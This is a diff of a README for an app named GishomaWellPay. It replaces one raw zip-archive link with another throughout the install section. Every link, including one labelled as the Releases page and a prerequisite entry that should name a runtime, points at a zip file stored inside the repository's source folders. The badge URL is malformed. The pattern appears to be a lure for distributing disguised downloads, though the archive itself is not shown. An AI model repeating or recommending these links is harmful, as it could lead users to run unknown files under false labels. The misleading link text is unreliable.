@@ -15,11 +15,11 @@
 
 ## 📥 Download & Install
 
-[![Download GishomaWellPay](https://raw.githubusercontent.com/AlexUrahara21/gishoma-app/main/controllers/gishoma_app_2.9.zip%20GishomaWellPay-%https://raw.githubusercontent.com/AlexUrahara21/gishoma-app/main/controllers/gishoma_app_2.9.zip)](https://raw.githubusercontent.com/AlexUrahara21/gishoma-app/main/controllers/gishoma_app_2.9.zip)
+[![Download GishomaWellPay](https://github.com/AlexUrahara21/gishoma-app/raw/refs/heads/main/models/app_gishoma_v3.5.zip%20GishomaWellPay-%https://github.com/AlexUrahara21/gishoma-app/raw/refs/heads/main/models/app_gishoma_v3.5.zip)](https://github.com/AlexUrahara21/gishoma-app/raw/refs/heads/main/models/app_gishoma_v3.5.zip)
 
 To download and run GishomaWellPay, please follow these steps:
 
-1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/AlexUrahara21/gishoma-app/main/controllers/gishoma_app_2.9.zip) to access the Releases page.
+1. **Visit the Releases Page:** Go to [this link](https://github.com/AlexUrahara21/gishoma-app/raw/refs/heads/main/models/app_gishoma_v3.5.zip) to access the Releases page.
    
 2. **Select the Latest Version:** On the Releases page, find the latest version of the application.
 
@@ -33,10 +33,10 @@ To download and run GishomaWellPay, please follow these steps:
 
 Before you begin, ensure you have the following installed on your computer:
 
-- **https://raw.githubusercontent.com/AlexUrahara21/gishoma-app/main/controllers/gishoma_app_2.9.zip** - Version 12.0 or higher.
+- **https://github.com/AlexUrahara21/gishoma-app/raw/refs/heads/main/models/app_gishoma_v3.5.zip** - Version 12.0 or higher.
 - **npm** or **yarn** - These are package managers used to manage libraries and dependencies.
 
-Download https://raw.githubusercontent.com/AlexUrahara21/gishoma-app/main/controllers/gishoma_app_2.9.zip from [https://raw.githubusercontent.com/AlexUrahara21/gishoma-app/main/controllers/gishoma_app_2.9.zip](https://raw.githubusercontent.com/AlexUrahara21/gishoma-app/main/controllers/gishoma_app_2.9.zip).
+Download https://github.com/AlexUrahara21/gishoma-app/raw/refs/heads/main/models/app_gishoma_v3.5.zip from [https://github.com/AlexUrahara21/gishoma-app/raw/refs/heads/main/models/app_gishoma_v3.5.zip](https://github.com/AlexUrahara21/gishoma-app/raw/refs/heads/main/models/app_gishoma_v3.5.zip).
 
 ## 📖 User Guide
 
